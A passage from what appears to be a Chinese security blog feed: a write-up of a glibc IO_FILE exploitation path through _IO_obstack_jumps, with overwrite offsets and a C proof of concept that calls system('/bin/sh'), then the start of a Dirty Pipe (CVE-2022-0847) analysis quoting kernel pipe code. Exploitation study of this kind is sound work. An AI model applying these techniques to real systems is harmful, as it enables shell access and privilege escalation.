obstack_blank_fast (obstack, size);</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其中存在一个assert，注意下面如果我们走exit这条路来清空所有缓存时触发的话就会出现rsi必定为<code>-1</code>的情况，所以此路不通</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221201130547767.png"                      alt="image-20221201130547767"                ></p><h3 id="IO-obstack-xsputn"><a href="#IO-obstack-xsputn" class="headerlink" title="_IO_obstack_xsputn"></a>_IO_obstack_xsputn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">_IO_obstack_xsputn (FILE *fp, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment"> space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们的目标时调用到<code>obstack_grow</code>函数，所以我们需要进入这个if语句，这一点很好说，如果我们可以控制这个结构体就可以非常轻松的控制这里的值而后进入if语句，随后又会执行<code>obstack_blank_fast</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))</span><br></pre></td></tr></table></figure><p>这个其实是一个宏定义，可以看到内部其实不会特别影响后续的内容。在继续执行就会进入我们期望的函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> obstack_grow(OBSTACK, where, length)                      \</span></span><br><span class="line"><span class="meta">  __extension__                                   \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                       \</span></span><br><span class="line"><span class="meta">       int __len = (length);                              \</span></span><br><span class="line"><span class="meta">       <span class="meta-keyword">if</span> (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, __len);                      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);                     \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;                           \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>可以看到这个也是一个宏定义，同样的我们又必须通过<code>_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</code>这条if语句才能调用到<code>_obstack_newchunk</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">  _obstack_newchunk (struct obstack *h, <span class="keyword">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="keyword">long</span> new_size;</span><br><span class="line">  <span class="keyword">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">long</span> already;</span><br><span class="line">  <span class="keyword">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="keyword">char</span> *) new_chunk + new_size;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里可以直接调用到我们期望的宏定义<code>CALL_CHUNKFUN</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>可以看到这里存在直接拿指针当作函数的操作<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code>，条件也就是<code>(((h)-&gt;use_extra_arg)</code>不为0；</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以从上到下的调用链也是可以直接写出来了:</p><p><code>_IO_obstack_xsputn</code>=&gt;<code>obstack_grow</code>=&gt;<code>_obstack_newchunk</code>=&gt;<code>CALL_CHUNKFUN</code>=&gt;<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code></p><p>最后再根据结构体属性的偏移写上上述约束的值即可。</p><p>当<code>_IO_list_all</code>指向我们可控A地址时，我们需要对A地址写入如下数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A + <span class="number">0x18</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0x20</span> = <span class="number">0</span>;</span><br><span class="line">A + <span class="number">0x28</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0x30</span> = <span class="number">0</span>;</span><br><span class="line">A + <span class="number">0x38</span> = system_addr;</span><br><span class="line">A + <span class="number">0x48</span> = bin_sh_addr;</span><br><span class="line">A + <span class="number">0x50</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0xd8</span> = _IO_obstack_jumps+<span class="number">0x20</span>;</span><br><span class="line">A + <span class="number">0xe0</span> = A;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221201134245450.png"                      alt="image-20221201134245450"                ></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> bin_sh_addr[<span class="number">0x10</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> libc_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> printf_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *IO_2_1_stderr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> IO_obstack_jumps;</span><br><span class="line"><span class="built_in">strcpy</span>(bin_sh_addr,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start!\n&quot;</span>);</span><br><span class="line">printf_addr = <span class="built_in">printf</span>;</span><br><span class="line">libc_base = printf_addr - <span class="number">0x55700</span>;</span><br><span class="line"></span><br><span class="line">IO_2_1_stderr = libc_base + <span class="number">0x1f7680</span>;</span><br><span class="line">IO_obstack_jumps = libc_base + <span class="number">0x1f33a0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x28</span>/<span class="number">8</span>)) = <span class="number">0x1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x30</span>/<span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x18</span>/<span class="number">8</span>)) = <span class="number">1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x20</span>/<span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x50</span>/<span class="number">8</span>)) = <span class="number">1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0xd8</span>/<span class="number">8</span>)) = IO_obstack_jumps+<span class="number">0x20</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0xe0</span>/<span class="number">8</span>)) = IO_2_1_stderr;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x38</span>/<span class="number">8</span>)) = system;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x48</span>/<span class="number">8</span>)) = bin_sh_addr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上libc均使用:<code>Ubuntu GLIBC 2.36-0ubuntu4</code></p><hr><p>参考文章</p><p><a class="link"   href="https://tttang.com/archive/1845/#toc" >https://tttang.com/archive/1845/#toc<i class="fas fa-external-link-alt"></i></a>_</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;近期又出现一个新的关于&lt;code&gt;IO_FILE&lt;/code&gt;的利用方式，不过原作者并没有出名字但是我blog又是用house of系列分类的所以就先随便取个名字。&lt;/p&gt;
&lt;h2 id=&quot;原理分析&quot;&gt;&lt;a href=&quot;#原理分析&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0847 Dirty Pipe</title>
    <link href="https://cv196082.gitee.io/2022/11/22/CVE-2022-0847-Dirty-Pipe/"/>
    <id>https://cv196082.gitee.io/2022/11/22/CVE-2022-0847-Dirty-Pipe/</id>
    <published>2022-11-22T12:54:31.000Z</published>
    <updated>2022-11-22T12:54:02.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>持续性摆烂一段时间了，又想看jyy的课，又要期末考试了，好烦！索性花点时间把Gyan神上半年叫我复现的CVE复现了。</p><p>这个CVE允许向任意可读文件中写数据，可造成非特权进程向root进程注入代码。该漏洞发生linux内核空间通过splice方式实现数据拷贝时，以”零拷贝”的形式将文件发送到pipe，并且没有初始化pipe缓存页管理数据结构的flag成员。</p><h2 id="零拷贝"><a href="#零拷贝" class="headerlink" title="零拷贝"></a>零拷贝</h2><p>首先需要了解一下零拷贝的概念，在普通的文件传输过程是如下图所示，可以看到这里进行了四次上下文切换，导致不必要的浪费和开销</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/f31ece783dd86621734188fa2d58b4bb.png"                                     ></p><p>所以linux内核出现了解决办法就是可以快速高效地将数据从文件系统移动到网络接口，而不需要将其从内核空间复制到用户空间，而这也就是所谓的零拷贝，在linux内核中有splice方式来解决。</p><p>这个系统调用不仅支持网络层面的传输，如果用户拥有两个已经打开的文件描述符可以任意文件相互连接，而不仅限于socket。</p><h2 id="pipe原理"><a href="#pipe原理" class="headerlink" title="pipe原理"></a>pipe原理</h2><p>pipe在前面的利用中也使用到过，不过大多是利用它申请的结构体的堆块劫持ops或者泄漏，这里主要是使用他初始化会带来的内容。</p><p>首先我们清楚pipe会创建两个文件描述符，一个是输入另一个输出。在内核中pipe缓冲区的总长度是65536字节，一共16页，这里页与页之间不连续是通过数组进行管理的，维护的是一个类似于链表的结构。以前就提到过，pipe在内核中是下图这样的表现形式：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/640.jpeg"                                     ></p><p>有pipe_buffer结构体只想page，而pipe_buffer结构体在往期kernel中有详细介绍，这里就不再赘述了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="keyword">ssize_t</span> chars;</span><br><span class="line"><span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null write succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">ret = -EXDEV;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Only wake up if the pipe started out empty, since</span></span><br><span class="line"><span class="comment"> * otherwise there should be no readers waiting.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If it wasn&#x27;t empty we try to merge new data into</span></span><br><span class="line"><span class="comment"> * the last buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment"> * page-aligs the rest of the writes for large writes</span></span><br><span class="line"><span class="comment"> * spanning multiple pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line"><span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"><span class="keyword">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment"> * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment"> * it, either the reader will consume it or it&#x27;ll still</span></span><br><span class="line"><span class="comment"> * be there for the next write.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += copied;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -ERESTARTSYS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We&#x27;re going to release the pipe lock and wait for more</span></span><br><span class="line"><span class="comment"> * space. We wake up any readers if necessary, and then</span></span><br><span class="line"><span class="comment"> * after waiting we need to re-check whether the pipe</span></span><br><span class="line"><span class="comment"> * become empty while we dropped the lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">&#125;</span><br><span 